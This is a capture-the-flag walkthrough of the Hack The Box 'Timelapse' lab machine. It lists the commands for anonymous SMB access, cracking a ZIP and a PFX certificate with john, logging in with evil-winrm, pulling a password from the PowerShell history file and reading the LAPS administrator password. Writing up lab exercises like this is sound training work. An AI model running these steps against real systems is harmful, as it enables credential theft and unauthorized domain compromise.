## Timelapse

Difficulty: Easy

### User Flag

```
rustscan -a 10.10.11.152 --ulimit 5000 -- -A -sV -sC -oN nmap.txt
```

![rustscan](https://github.com/b1d0ws/OSCP/assets/58514930/07df025c-2f70-40de-9ec1-e1d146e13824)

<br>

We can list smb and connects to "Shares" folder without a user.  

There is a ZIP file inside it.

```
smbclient -L 10.10.11.152 --no-pass

smbclient //10.10.11.152/Shares -U ""
```

![listingSMB](https://github.com/b1d0ws/OSCP/assets/58514930/f5de6819-4580-4669-8d08-8fc5649709a4)

![smbclient](https://github.com/b1d0ws/OSCP/assets/58514930/9bbbd965-3be1-481a-9754-99b7add8062e)

<br>

The ZIP file is password protected. We can crack it with john.

```
zip2john winrm_backup.zip > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![crackingPassword](https://github.com/b1d0ws/OSCP/assets/58514930/fdc41fa5-f3ae-456c-a939-8e6c15c6c449)

<br>

Extracting the ZIP, we get a pfx file. We can extract kets and cert from this, but we need a password to do it.

We can crack the password with [crackpkcs12](https://github.com/crackpkcs12/crackpkcs12) or pfx2john.

```
crackpkcs12 -b legacyy_dev_auth.pfx -d /usr/share/wordlists/rockyou.txt

pfx2john legacyy_dev_auth.pfx > legacyy_dev_auth.pfx.hash
john legacyy_dev_auth.pfx.hash --wordlist=/oprt/wordlist/rockyou.txt
```

![crackpkcs12](https://github.com/b1d0ws/OSCP/assets/58514930/123ee003-091b-49b5-8312-33c238e76125)

<br>

Extract key and cert with the password found.

```
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
```

![extractingKeyAndCert](https://github.com/b1d0ws/OSCP/assets/58514930/47cba83e-cf5e-4d60-a66f-ea3b7fd5659c)

<br>

Use evil-winrm to authenticate with this files.

```
evil-winrm -S -k key.pem -c cert.pem -i 10.10.11.152
```

![evil-winrm](https://github.com/b1d0ws/OSCP/assets/58514930/216f87e4-4374-4d5b-b652-f4a34914f806)

<br>

### Root Flag

First we get access to svc_deploy user. His password is on powershell command history file.

```
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

evil-winrm -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -i 10.10.11.152 -S
```

![enumeratingHistory](https://github.com/b1d0ws/OSCP/assets/58514930/b10dbe07-0888-4702-83fd-70ecd94531d2)

<br>

Checking groups for this user, we see that he belongs to LAPS_Readers.

```
net user svc_deploy
```

![checkingGroups](https://github.com/b1d0ws/OSCP/assets/58514930/49bccf46-491b-4a0e-8d7f-11a4fd8548ee)

This allow us to get password from LAPS with the command above.

```
Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Property *

evil-winrm -S -u 'Administrator' -i 10.10.11.152
```

![adminPassword](https://github.com/b1d0ws/OSCP/assets/58514930/3c0358ec-0d99-485d-a2e7-b66fd81050cd)

<br>

This [python script](https://github.com/n00py/LAPSDumper/blob/main/laps.py) that can also be used.

```
python3 laps.py -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d timelapse.htb 
```

![lapsPy](https://github.com/b1d0ws/OSCP/assets/58514930/7b81b163-64a1-4277-9fb0-9b8d849e9578)
